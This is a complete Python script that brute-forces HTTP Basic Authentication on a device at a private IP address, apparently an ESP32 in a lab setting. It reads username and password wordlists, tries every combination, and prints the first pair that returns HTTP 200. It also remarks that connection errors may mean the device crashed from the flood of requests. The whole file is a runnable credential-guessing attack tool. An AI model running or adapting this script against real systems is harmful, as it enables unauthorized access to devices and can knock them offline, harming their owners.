import requests
from requests.auth import HTTPBasicAuth
import time

# Target configurations
target_url = "http://10.42.0.50/"

def start_brute():
    try:
        # Load users and passwords from files
        with open("testuser.txt", "r") as u_file:
            users = [line.strip() for line in u_file if line.strip()]
        
        with open("testpass.txt", "r") as p_file:
            passwords = [line.strip() for line in p_file if line.strip()]

        print(f"[*] Target: {target_url}")
        print(f"[*] Wordlists loaded: {len(users)} users, {len(passwords)} passwords.")
        print("-" * 40)

        for user in users:
            for password in passwords:
                print(f"[?] Testing: {user}:{password}    ", end="\r")
                
                try:
                    response = requests.get(target_url, auth=HTTPBasicAuth(user, password), timeout=3)
                    
                    if response.status_code == 200:
                        print(f"\n\n[!] SUCCESS!")
                        print(f"[!] Credentials: {user}:{password}")
                        return # Stops the script when found
                        
                except requests.exceptions.RequestException:
                    print("\n[!] Connection error. The ESP32 might have crashed (DoS).")
                    return

        print("\n[X] Attack completed. No valid combination found.")

    except FileNotFoundError as e:
        print(f"[ERROR] File not found: {e.filename}")

if __name__ == "__main__":
    start_brute()